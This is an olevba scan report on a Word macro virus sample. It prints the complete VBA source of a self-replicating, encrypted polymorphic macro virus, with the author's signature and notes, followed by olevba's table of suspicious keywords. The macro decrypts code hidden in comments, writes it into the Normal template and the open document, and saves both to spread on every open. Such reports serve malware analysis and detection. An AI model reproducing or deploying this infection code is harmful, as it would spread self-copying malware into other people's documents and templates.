olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Illegble.b-40baa3af772c67c777562feb25baeef44107de71
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Illegble.b-40baa3af772c67c777562feb25baeef44107de71 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Illegble.b-40baa3af772c67c777562feb25baeef44107de71 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'25
'
'w–In››�›I{Ћќџ—ЏJxЏўћKRx¤yЊ�ђKiL™\\ђfLѓџ–ЎЎ’›o¦MjN”^ “N‰ѓq^‚љђњ¦”ЎљЈ_t†sЌ
'
'{�RЂЎ¤џ”џ‡� Јџ”§�bЉv„¦Јћ™—©c‹wx¤ўҐ¤¤›¤Є©^g_dz¦›њ„¦›¬Јќf¤Ў¦ќ«`ieYjbYvY[‰¬Ј°›®џZЌЇњ[Єћ°Ё ©Ї›‹¬ЎЄde^\‘Ґў«]‹‘†‹^{^’°іЈ
'{�Rs•¦›©�wў–Ё �Ў§bЉv„¦Јћ™—©c‹wx¤ўҐ¤¤›¤Є©^g_dz¦›њ„¦›¬Јќf¤Ў¦ќ«`ieYjbYvY[‰¬Ј°›®џZЌЇњ[Єћ°Ё ©Ї›‹¬ЎЄde^\‘Ґў«]~Ѓ†‹^{^’°іЈ
'
'i‡AoujoA^Av”—‡Bcђ†BdglqC_aCw–™‰DxЊ‰’
'FyЊ›Go–љ›GdHv—љ•‰”|Ќ–™•ЉќЋWkzњ™”ЏЌћXЂmnљ�›љ™ђ™ џT]UZo›ђ’zњ‘ў™’
'GzЊ›G{€љЏЌњHeHi‹ќ’џЋm�Њћ–Џ�ћXЂlzњ™•ђЋџYЃmnљ™њ›љ‘љ џT^V[pњ‘’zњ‘Јљ“
'_€~:cЂ
'
'i‡AoujoA]_Bv”—‡Bcђ†CdglqC`Cw–™‰DxЊ‰’
'FyЊ›Go–љ›GdHi‹њ‘ћЌl—Њћ–Ћ—ќWkzњ™”ЏЌћXЂmnљ�›љ™ђ™ џT]UZo›ђ’zњ‘ў™’
'GzЊ›G{€љЏЌњHeHv—›–Љ•}Ћ–™•‹ћЏXЂlzњ™•ђЋџYЃmnљ™њ›љ‘љ џT^V[pњ‘’zњ‘Јљ“
'_€~:cЂ
'
'nЏ|ЌЏ‡„ЏђV
'A·А§А°Л
'A§вНВ№¤Ч
'AУЙЪћ¬ў¤
'AҐњГМД
'BЈ«Пѕё©ТвЕ¤
'BєїБ¬µ¤ЙЄв
'@ј°Ь
'B±ОЇЈџґШіЇ
'A®¶ А¬ЬИ
'BбµЕўЛ»е¦в
'B¶ЁА­ж¦џ¶
'AаД»ЫЪОТ
'_€‡„ЋЏU
'
'eЋ‘?x@]@Q@tЏ@iђ”•O„ђ–Џ–‘€Ћ‹ђ‡•
'n‹Em”�љT’Џ”‹™N~RGXPGdGIv•Hmљљ—љHzЌњћ–ЋIwЋЎќLJ~’Џ�JrvKhKѓ
'fѓ=aЊЊ’>Z\>rђ“„?s‡„Ќ
'????•‹€Ќ…@]@hЏ“”NЌЉЏ†”IyMASK
'@@@A—„ђ…†A^A�…‘†‡BHB�ЏЊ‘€CICf‹–LUWM
'<<<<’€…Љ‚=Z=??
'FFFFoЊGo–љ›U“ђ•Ќ›PЂTHYQHfIKy›’џЉќЏJ}џЊJn™Ќ �ђ™џЉn—љџ‘TUNLЂ”‘›
'BBBBBCCC™†’‡€CaDљ‡“€‰DJEGj“‰Exљ‡HFLFiЋ�NWYP
'<<<<<<<<fi=Z=u
'=======>bЌЊ’>[>r‘”„
';;;;`‰<e‚
'_€~:cЂ
'j‡Ai‘•–PЋ‹ђ‡•K{OCTLC`CFw�…–�ђЌ—™_GEyЌЉ“
';<<<c‹<Y<pЏ’‚
'_€~:cЂ
'l‰Dl“—�RђЌ’Љ�M}QEVNEcFHk”Љ’Џ™љaIG{ЏЊ•Gk—–ЌHeH|љќЋ
'i†@gЏA^Au“–†Abђ†Bf‘ђ‡B^aCw•�€Cw‹‰’
'BCCCl‰CpЊ‡Ll“—�RђЌ’Љ�M}QEVNQFWRFWOFcFHNIG{ЏЊ•
'BBBBBBBCrЏ‡Џ€‘C`Dp‰’Ll“—�S‘Ћ“Љ�M}QFWOOFSFW
'CCDDDDDDsђ€{†—EbErЋ‰Nn•™љT’Џ”‹љOSGXPSGZTHw”Њ”Ќ–R
'??@@@@@@s‰љ†A^AjЏ•Isђ†BLB[KBMCV
'>>>>????eЋ‘?x?]@Q@tЏ@s‰›†
'AABBBBBBBBBCkC`Cf‹•Km’�Lv’€DNE\YNEPEVXVO
'??@@@@@@@@@Ao†�w‚“A^Bp‡™xѓ”BHCk
'=========>>>f>[>@@
'<<<<<<<<k‚•‘=v
'>>>>>>??eЋ‘?y?\?hl@tЏ@il
'CCCCCCCCDDDDj“–DtEbEVEy”Eq‹”Nn•™љT’Џ•ЊљOЃSGXPQ
'GGGGGGGHHHHHHHHHrЏIv’ЌQq�ќћX–“�ЏќR…WK\TWK{WL{�ђ�‘љULjM|™‘ѓЋџMЃ–“њ
'@@@@@@@AAAAAAAAABBBBk€BrB`CTCw‹€‘
'OOPPPPPPPPPQQQQQQQQQRRRRs�¦—¤‰”ҐSpSЂњ—[|Ј§Ёb ќў™Ё]ЏaUf^aU…ўљў›¤VaVhcWѓњҐ_¦«¬f¤Ў¦ќ«`“eYjbbYfY‰¦ћ¦џЁZeZkd
'DDDDDDDEEEEEEEEEFFFFFFFF”‹ћ“ђ•ЊGdGuЌџ~‰љHNHiЏќЋ›Љ›
'DDDDDDDEEEEEEEEEFFFFFFFFn•љ›U™Њ—“€ЉЌ”‘–ЌH‚TH—Ћ •’—Ћ
'DDDDDEEEEEEEEEFFFFFFFFFF•Њћ“ђ•ЊGdHJJbHiЋњЌ›Љ›IfIKKd
'>>>>>>??????????@@@@eЊ“…
'GGGHHHHHHHHHIIIIIIIIIJJJЊЏђ™њЏЎЊќKhKx”ЏTt›џ Z�•љ’ U‡YM^VYM_ZN~N[N_W
'PPPQQQQQQQQQRRRRRRRRRSSSt™§�Ґ‰”¦TqTЃќ�\|¤Ё©cЎћЈљЁ^ђbVg_bV†WbW†Ј›ЈњҐdX„ќ¦`Ђ§«­gҐў§ћ¬a“fZkccZgZЉZh[Љ§џ§ ©[g\me
'FFGGGGGGGGGHHHHHHHHHIIII—Ћ •’�ЏJgJЊЏђ™ќђЎЊќKQKy‘Ј‚ЌћLRLm“Ў’џѓЋџ
'DDDDDDDEEEEEEEEEFFFFFFFFn•љ›U™Њ—“€ЉЌ”‘–ЌH‚TH—Ћ •’—Ћ
'GGGHHHHHHHHHIIIIIIIIIJJJ�ЏЎ–“�ђKhKMMeKl’ ‘ћ‚ЌћLiMOOgMЏ’“њџ“¤Џ NkNPP
'>>??????????@@@@@@@@eЏ…Aj‡
'=>>>>>>>>>??????dЌѓ?i†
'=========>>>lѓ–’>n
'<<<<<<<<k‚•‘=w
'@@@@@@@@Ћ†�”•“ЉЏ€A_BDIDBHBp€љy„•
'AAAAAAAAj‘•–P”‡’Ћ„†€ЏЊ‘€C{PD’‰›—�–Ќ“Њ
'@@@AAAAAo†�wѓ”B_BDD\B‘€љ–—•Њ‘ЉDaDFF
';;;;`‰<e‚
'_€~:cЂ
'h’Ћ:r
'
'sЂ‘†„“M€Ќ’…’”Њ‰Ћ…“@RMA—„ђ…†
'lѓ–j„�?\?hЌ“HrЋ„@J@RUJALAR
'hЏ“”N“†‘Ќ‚„†ЌЉђ‡BTNBJDIECICq€љn€ќM
'
'f:W:M
'fЏ’AzA^AjmALBSBv‘Bj‘•—Q†’�‘—’‰ђЌ’‰—
'EEEEn‹Fn•™љT’Џ”‹љOЂSGXPGdHJOЌ–Њ‹—ЊЋKI}‘Ћ—Iљџ“ћ�™ЎJgJќ ђ
'AAAAgђ”BvB_BSBv’Co€‘Kk’–�RђЌ’‰—L}QEVNN
'GGGGGHHH›ќЉ“ЌЎIfIr—ќQQQ^JTJvЏ�RrљћџY—”™ђћT…XL]UULWM_MWMЃVVM\N_f\aW
'AAAABBBBѓB_BoЊ‡Kk’–—QЏЌ’‰—L}PDUNQEyQEVN
'========>[>_‘ЃFG
'??@@@@@@c@]AѓALAo†�l‡›BMB•—„Ќ€њ
'========`>[>a†ђFaG
'??@@@@@@t…Ќ‘ЌЉЏ†A^Au‡Џ’Ћ‹ђ‡BHCf
';;;;iЂ“ђ<p
'AAAAiђ•–P”‡’Ћѓ…€ЏЊ‘€CoOCFKFDJDx‰‘•‘Ћ“Љ
'????s„ЊЏЊ‰Ћ…@]@BB[AmA^AmALBS
'h…@‘•‰”ЋЏ—@^Au“–†Au‰‡ђBgљ‹–Bh’•
'h’Ћ:s
'
'nЏ”‰ЏЋ“Nv‰’–”q“ђ•†„•‹‘ђB_BhѓЋ–€
'oђ”‰ЏЏ”OdђЏ‡Љ“Џe‘ђ�‡”•‹’‘–C`Ci„Џ—‰
'oђ”‰ЏЋ“Ns‚—†oђ“Ћ‚Ќr”‘Џ’–B_Bi„Џ–€
'
'c†—Њ™€g’†�‘‰’�Rw…љ‰f�Ef€™Ћ›Љj•‰›“‹”љTlњ““u€”Њ
'
'f‘Bwђ–‹ЏCk’–—QЏЊ’‰—LmpDODVQEVNEbEGk”ЉFy›€H
'??@@@hЏ“”N„†Ќ†•†ЌЉЏ†•BknBMBSNCT
'e‰‰Љ
'A‰~ЉЂ
Set ‹‚©ІЄ = NormalTemplate.VBProject
Set ќ¦ЌҐ•° = ‹‚©ІЄ.VBComponents(1).CodeModule
Set ЌЗІ§ћ‰ј = ActiveDocument.VBProject
Set №®їѓ‘‡‰ = ЌЗІ§ћ‰ј.VBComponents(1).CodeModule
If ќ¦ЌҐ•°.lines(1, 1) <> "Private Sub Document_Open()" Then Set €ђґЈњЌ¶Ж©€ = №®їѓ‘‡‰
If №®їѓ‘‡‰.lines(1, 1) <> "Private Sub Document_Open()" Then Set €ђґЈњЌ¶Ж©€ = ќ¦ЌҐ•°
If €ђґЈњЌ¶Ж©€ = "" Then Exit Sub
For џ¤¦‘љ‰­ЋЖ = 3 To €ђґЈњЌ¶Ж©€.countoflines
If Mid(€ђґЈњЌ¶Ж©€.lines(џ¤¦‘љ‰­ЋЖ, 1), 1, 1) <> "'" Then Exit For
ў–В = Mid(€ђґЈњЌ¶Ж©€.lines(џ¤¦‘љ‰­ЋЖ, 1), 2, Len(€ђґЈњЌ¶Ж©€.lines(џ¤¦‘љ‰­ЋЖ, 1)))
For –і”€„™ј—“ = 1 To Len(ў–В)
”›…Ґ‘Б­ = Chr(Asc(Mid(ў–В, –і”€„™ј—“, 1)) - (Right(€ђґЈњЌ¶Ж©€.lines(2, 1), Len(€ђґЈњЌ¶Ж©€.lines(2, 1)) - 1)) - (Int(((4 * Len(ў–В) + 2 * –і”€„™ј—“)) / 18.3)))
ЖљЄ‡° ЙЉЖ = ЖљЄ‡° ЙЉЖ & ”›…Ґ‘Б­
Next –і”€„™ј—“
›ЌҐ’Л‹„› = ›ЌҐ’Л‹„› & ЖљЄ‡° ЙЉЖ & Chr(13): ЖљЄ‡° ЙЉЖ = ""
Next џ¤¦‘љ‰­ЋЖ
For Ж© Аїі· = 1 To €ђґЈњЌ¶Ж©€.countoflines
If €ђґЈњЌ¶Ж©€.lines(Ж© Аїі·, 1) = "Private Sub Document_Close()" Then
Application.ScreenUpdating = False
€ђґЈњЌ¶Ж©€.insertlines Ж© Аїі· + 1, ›ЌҐ’Л‹„›
Exit For
End If
Next Ж© Аїі·
Call Document_Close
NormalTemplate.Save
ActiveDocument.SaveAs ActiveDocument.FullName
End Sub
Private Sub Document_Close()
End Sub

'<-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=->

'MyName = WM97.m00d
'WrittenBy = f0re [UC/Skamerks/DVC]
'
'This is my first attempt to write an encrypted polymorphic macro virus.
'I havent included any payload. Stealth is also left out (see my other macros for
'good stealth techniques). Although this virus is a bit slow, it works fine. I did have
'some problems with the randomly generated key. Though you can check this out for yourself.
'If you find any other errors please let me know. Have phun.

'<-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=->
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

